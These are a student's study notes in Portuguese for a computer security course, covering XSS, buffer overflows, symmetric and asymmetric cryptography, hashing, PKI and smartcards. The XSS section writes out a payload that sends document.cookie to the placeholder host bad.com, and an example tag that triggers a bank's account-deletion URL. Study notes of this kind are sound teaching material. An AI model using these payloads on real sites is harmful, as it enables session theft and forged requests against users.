VULNERABILITIES
zero-day: quando só descobres a vulnerabilidade e começas a descobrir como resolver no momento que acontece o ataque
cve: vulnerabilidades e exposições comuns
cert: organização que garante o uso de de tecnologia e sistemas apropriados
csirt: organização responsável por receber, rever e responder a incidentes de segurança computacional

-----------------------------------------------------------------------------------------------------------------------------
XSS
xss: injeção de scripts em webpages pelos clientes do mesmo

alert: <img src=‘img.png’> </img> -- (xss) -- <img src=‘img.png’> <script> alert(“hi”); </script> </img>
roubar cookies: <img src=“img.png” onload=“window.open(‘http://bad.com/reg.php?’+document.cookie)” > </img> 
Pode ser inserido:
 junto de texto (<p>Hi there<script>alert(‘hehe’)</script></p>)
 em media tags (<img src=“http://bank.com/delete_account.php”></img>)
 em urls (http://foo.bar/index.php?search=<script>alert(‘hi’)</script>)

stored xss: a página já está guardada no web server com o script malicioso, previamente colocado pelo hacker

reflected xss: o cliente abre a página através de um link malicioso, com um script embutido no link

cross-site request forgery (csrf): a pagina ja está guardada no webserver com o script E 
				o script ao ser executado faz um request a outro site (ex: banco)

-----------------------------------------------------------------------------------------------------------------------------
BUFFER OVERFLOWS
kernel organiza a memória em páginas, tipicamente de 4kB
processos correm em um espaço de memória virtual, mapeado para 4k páginas reais
páginas podem ser agrupadas para dar mais segurança (read-only, read-write) 
	ou para dar mais performance (dynamic (apagado no fim), static (mantem permitindo ser reutilizado))

estrutura:
 Text (código do programa, constantes globais (ReadOnly))
 Data (variaveis globais inicializadas)
 BSS (variaveis globais não inicializadas)
 Heap (dados dinamicos sem variaveis)
		|
		v
 Shared libraries (código de libraries e suas variaveis globais (pode ser ReadOnly))
		^
		|
 Stack (parametros de funções, variaveis locais)

base pointer: adress base da stack frame da função (stack frame tem os parametros e as variaveis locais da função)
stack pointer: aponta para o fim da stack (ultimo valor que levou push)
instruction pointer: aponta para a instrução atual
dizem-se EBP, ESP e EIP caso sejam registos de 32bits
stack é invertida, sendo que para pegar em variaveis locais teria de se fazer base pointer - 8 por exemplo

problemas de buffer overflow:
 escrever por cima de valores armazenados ao lado do buffer
 escrever por cima de saved registers como saved ip (return adress) ou saved bp (base address do stack frame anterior)

stack smashing attack: dar overflow a uma variavel local até ao return adress e mudá-lo para ele dar jump para o 
		injected data com código executavel (o atacante precisa de saber o adress absoluto da variavel vulneravel)
mitigation/prevention: impedir a execução de instruções em segmentos/páginas que normalmente não têm código
		       randomize o espaço de endereços para o segmento nao ficar em posiçoes fixas em varias execuçoes
				(previne saltos para locais de codigo conhecidos / os segumentos mantêm a sua posiçao relativa)
		       reordenação de variaveis porque as mais vulneraveis sao arrays, entao para proteger as outras variaveis locais,
				colocasse os arrays perto dos saved registers
		       canary é um valor desconhecido colocado ao lado dos saved registers, que as funçoes vao verificar se foi mudado
				antes de irem buscar o return address aos saved registers

-----------------------------------------------------------------------------------------------------------------------------
SYMMETRIC CRYPTOGRAPHY
plaintext usa key para criar cyphertext, é possivel fazer o caminho inverso
impossivel usar bruteforce para keys com 128 bits ou mais E que sejam realmente random

5 regras Shannon:
 necessidade de mais segurança implica mais encriptação (ou mais key length)
 o set das keys e o algoritmo de encriptação não devem ser muito complexos
 a implementação do processo deve ser simples
 os erros que acontecerem nao se propagarem e estragarem o resto do sistema
 o tamanho dos ciphertexts nunca ser maior que o tamanho do plaintext

confusion: ciphertext depende do plaintext+key, p.e. "at" = "dw" (a+3=d & t+3=w)
diffusion: por exemplo partir um texto em colunas, avalanche effect

para prevenção, assume-se sempre que o algoritmo é conhecido, e por isso a segurança assenta no desconhecimento da key

a robustez de um algoritmo é a sua resistencia a ataques
algoritmos com maiores keys sao mais fortes mas normalmente mais lentos
algoritmos publicos sem ataques conhecidos sao provavelmente os mais fortes por ao serem publicos têm muita gente a tentar encontrar vulnerabilidades

tipos de ciphers:
 transposition: letras do texto inicial são misturadas de forma random ou por block permutations p.e. "atum" (3214) = "utam"
 substitution: cada simbolo é substituido por outro (monoalphabetic 1 alfabeto, polyalphabetic N alfabetos, homophonib 1 por muitos)
		(periodo entre alfabetos pode ser descoberto pelo kasiski method/test)

rotor machines implementam polyalphabetic ciphers complexas, onde cada rotor tem uma permutação (um set de substituições)
a key vem do set de rotors usados, da sua posição original e ordem entre si e da posiçao do anel giratório

stream ciphers sao uma mistura duma keystream com o plaintext ou o ciphertext (tamanhos do plaintext/ciphertext têm de ser mais pequenos)
cada simbolo duma keystream é um alfabeto
não se pode usar diffusion, apenas confusion

tipos de cifras modernas:
 (pelo modo como funcionam:) block ciphers (1 alfabeto) ou stream ciphers (N alfabetos)
 (pelo tipo de key:) simetricas (secret key) ou assimetricas (public key)
	(stream ciphers só podem ser simetricas)

uma secret key é apenas conhecida/partilhada por 2 ou mais pessoas e que permite confidencialidade
vantagem: performance
desvantagem: quanto mais pessoas a sabem, menor a segurança total
problemas: como distribuir a chave da forma mais eficiente/segura

block ciphers:
é comum usaram bit blocks grandes de 64, 128, 256, etc.
	os mais comuns: DES (chave 56 bits), IDEA, AES (chave 128,192,256 bits)
DES tem como desvantagem um keyspace de apenas 56bits, vulneravel a brute force
para compensar, pode se usar Triple DES (com 2 ou 3 keys, 112/168 bits), mas fica muito lento

algoritmos comuns de stream ciphers: A5, RC4, E0 (bluetooth), SEAL

uniform random access: mesmo tempo para chegar ao local de qualquer informação independentemente de onde esta guardado

cipher modes (inicialmente criado para DES, mas em principio podem ser usados para as outras):
 ECB (eletronic code book)	- precisa de inputs do tamanho de blocos e para isso usa padding
 CBC (cipher block chaining)	- precisa de inputs do tamanho de blocos e para isso usa padding
 OFB (outpub feedback)
 CFB (cipher feedback)

key whitening (DES-X): maneira simples e eficiente de adicionar confusion

-----------------------------------------------------------------------------------------------------------------------------
CRYPTOGRAPHIC HASHING
digest functions: 
 dão resultados muito diferentes para textos aparentemente similares
 dado um digest, é quase impossivel encontrar o texto original que o produz
 é quase impossivel encontrar dois textos que produzam o mesmo digest

algoritmos comuns: MD5 (128bits), SHA-1 (160bits, já nao é seguro desde 2017), SHA-2 aka SHA-256/SHA-512

message authentication codes (MAC): são hash ou digest computados com uma chave, usado para autenticar mensagens
				    podem ser feitas encriptando um digest com uma symmetric block cipher (DES, AES)
				    podem ser feitas encriptando com feedback e propagação de erros (CBC)
				    podem ser feitas adicionando uma key a hashed data (MD5, HMAC)

tipos de uso de MAC:
 Encrypt-then-MAC 	- MAC vem do cyphertext (IPSec)
 Encrypt-and-MAC 	- MAC vem do plaintext e não é encriptado (SSH)
 MAC-then-Encrypt	- MAC vem do plaintext e é encriptado (TLS)

-----------------------------------------------------------------------------------------------------------------------------
ASYMMETRIC CRYPTOGRAPHY
asymmetric block ciphers usam key pairs (uma key public e uma key privada (pessoal, intransmissivel))
 permite confidencialidade sem troca previa de segredos (chave é publica, nao precisam de a comunicar)
 permite autenticação para dados (data integrity) e para origem (assinatura digital)

algoritmos mais comuns: RSA, ElGamal, ECC (elliptic curves)

vantagens: N peers requiring pairwise, secret interaction = N key pairs
desvantagens: performance má (ineficiente e consome muita memória)
problemas: distribuir as public keys, tempo de vida dos key pairs

modos:
confidencialidade:
ao enviar uma mensagem, dá-se encrypt com a public key do destino, e ele depois dá decrypt com a sua private key
	problemas: o destino não sabe quem produziu a mensagem pois se a public key é publica, pode ter sido qualquer um (não há conhecimento da origem da mensagem)

autenticação na source:
ao enviar uma mensagem, dá-se encrypt com a própria private key, e o destino dá decrypt com a minha public key
	problemas: qualquer pessoa com a minha public key pode dar decrypt a mensagem (não há confidencialidade)

tecnica Diffie-Hellman (key agreement): serve para dois desconhecidos partilharem uma chave secreta sob um canal de comunicação inseguro
funcionamento: ambos decidem num número base que ambos sabem, e depois adicionam um número secreto e partilham o resultado
	entre eles. Ao combinarem o seu número secreto com a mistura do número base+secreto do outro obtêm uma chave comum

RSA: fazem uma merda qualquer com 4 variaveis nao percebi pisso
ElGamal: similar ao RSA, uma variante é usada para assinaturas digitais, tem uma variavel 'k' que tem de ser random e secreta
Elliptic curve: curva descrita por uma equação e que é simetrica ao eixo do x
	sendo G um ponto da curva, P um inteiro multiplo de G, temos x * G = P, onde 'P' é a chave pública e 'x' a chave privada
	encriptação hibrida: criam uma key através da publickey e fazem encriptaçao simétrica

N encriptações com o mesmo valor e key, devem dar N resultados diferentes
	objetivo: prevenir descoberta por trial & error / brute force
tecnicas: concatenar a data a encryptar com dois valores, um fixo (para controlo de integridade) e outro random
	  PKCS#1 (Public Key Cryptography Standards)
	  OAEP (Optimal Asymmetric Encryption Padding)

Assinaturas digitais: 
	objetivos: autenticar o conteudo do documento (garantir integridade)
		   autenticar o autor do mesmo (garantir a identidade do criador)
	 	   prevenir que o autor negue a autoria (authorship/ownership) do documento
	tecnologias: encriptação assimétrica + digest funcions (para melhorar performance)

	passos para assinar: é aplicado uma hash function na data
			     o resultado é encriptado com a privatekey do que assina
			     o resultado (dito assinatura) é juntado a um certificate e depois juntado a data original

	passos para verificar: separa-se a data da assinatura
			       é aplicado uma hash function na data (1)
			       assinatura é decriptada com a public key do que assina (2)
			       se os dois resultados (1 e 2) forem iguais, então a assinatura é valida

	chaum blind signatures (implementado com RSA): é usado um fator random K antes de encryptar com a privatekey

-----------------------------------------------------------------------------------------------------------------------------
ASYMMETRIC KEY MANAGEMENT
objetivos: gerar key pairs (quando e como)
	   proteger as private keys
	   destribuição correta das private keys mundialmente
	   definir tempos de vida bons para os key pairs (perceber quando é que um key pair fica obsoleto)

gerar key pairs (quando e como): ter um bom gerador de números random (p.e. Bernoulli 1/2 generator)
				 facilitar complexidade sem comprometer a segurança (usar chaves publicas RSA eficientes)
				 cada um gera a sua privatekey (maximiza privacidade, pode não ser muito enforçado caso o keypair não vá ser usado para assinaturas)      

proteger as private keys: proteger o acesso com password ou PIN
			  corrigir as aplicações que manuseiam as privatekeys
			  confinar a private key num cryptographic token que nunca exporta a privatekey (só a publickey) e que usa a privatekey para encriptar e decriptar internamente

public key certificates: documentos feitos por uma Certification Authority
associam/prendem uma public key a uma entidade
são documentos publicos que não contêm nenhuma informação privada
são criptograficamente seguros, ou seja, são assinados pelo autor e não podem ser modificados
são usados para distribuir public keys que podem ser confiadas caso a Certification Authority possa ser confiada

um keypair está preso a um perfil de uso pelo certificado que o anuncia 

Certification Authoroties (CA): organizações que gerem certificados de public keys
		definem politicas e mecanismos para gerar, destruir e distribuir certificados e tambem distribuir as private keys correspondentes

tipos de CAs:
Intermediate Certification Authoroties: CAs certificadas por outras CA
Root Certification Authoroty: têm uma trusted public key (são a trust anchor), implementados por certificados que eles mesmo certificam

PEM model (Privacy Enhanced Mail): hierarquia mundial com apenas uma root e várias PCA (Policy Creation Authorities) debaixo da root
		e várias CAs (de organizações ou empresas) debaixo de cada PCA

PGP model (Pretty Good Privacy): cada pessoa pode ser um possivel certificador e por isso pode gerar um certificado e publica-lo.
		A confiança vem de confiar nos que os que tu confias confiam ('A' confia em 'B', 'B' confia em 'C', 'A' confia em 'C' porque confia em 'B')

key pairs têm de ter tempo de vida pois private keys podem ser perdidas ou descobertas

Certificate Revocation Lists (CRL): certificados podem ser ignorados por alguma razão antes da sua validade acabar e colocados nestas listas que sao partilhadas entre CAs

uma assinatura é válida se foi gerada enquanto o certificado era válido
um certificado pode ser util mesmo após invalido para ver assinaturas passadas

Time Stamping Authority (TSA): adiciona trust à data em que assinatura foi feita (impedir uso de assinaturas já inválidas)

PKI (Public Key Infrastructure): infrastrutura que permite o uso de key pairs e certificados
cria os key pairs para cada entidade e distribui, seguindo as politicas corretas
faz as inserções dos CAs na hierarquia de CAs
faz update e publica as CRLs e tambem define as politicas para invalidar(revoke) certificados
usa protocolos e estruturas para permitir operaçoes entre componentes/pessoas/serviços

PKI no cartao de cidadao:
	cada pessoa tem multiplos key pairs (um para autenticaçao, outro para assinar) gerados no cartão e não podem ser exportados
	requer um PIN para cada operação

-----------------------------------------------------------------------------------------------------------------------------
SMARTCARDS
smartcard: cartão com capacidade de processamento computacional (CPU, ROM, EEPROM, RAM)

APDU (Application Protocol Data Unit): se T=0 é transmitido byte a byte, se T=1 é transmitido em blocos de bytes (mais rápido)

File system:
	tipos de ficheiro: Master File (MF): file system root
	       		   Dedicated File (DF): parecido a um diretório. pode conter outros Dedicated Files ou Elementary Files
	       		   Elementary File (EF): ordinary data file. tamanho do ficheiro é fixo e determinado na criação
	tipos de sistema: Transparent: blocos de data sao identificados pela soma do offset com o tamanho do bloco
			  Fixed records/Variable records: existe indices/indexes
			  Cyclic: um ponteiro para leitura e outro para escrita que percorrem todo o espaço com incrementos ciclicos
	tipos de acesso: protegido, precisa de um MAC (message authentication code) computado com a chave partilhada entre o cartao e a aplicaçao
			 autenticação externa, login já feito no passado / já tiveram uma chave partilhada entre si/em comum

protocolos (deve ser inutil saber isto):
	autenticação externa: cartão autentica a aplicação
	autenticação interna: aplicação autentica o cartão
	secure messaging: proteger a data lida do cartão e proteger a data escrita no cartão
	authenticated reading/writings (autenticar com MAC) (confidencial se houver troca de key secreta)
	session key derivation & upload

OpenCard Framework (OCF): facilitar o desenvolvimento de soluções baseadas em smartcards
fazem parte desta framework:
 criador dos cartões (inicializa o cartão e personaliza)
 OS (comportamento basico do cartão, lowest level)
 leitor de cartões (interfaces que lidam com leitura e escrita em cartoes)
 aplicações

Librarias que diminiuem a distancia entre funcionalidades dos smartcards e aplicações: principal PKCS
-----------------------------------------------------------------------------------------------------------------------------
	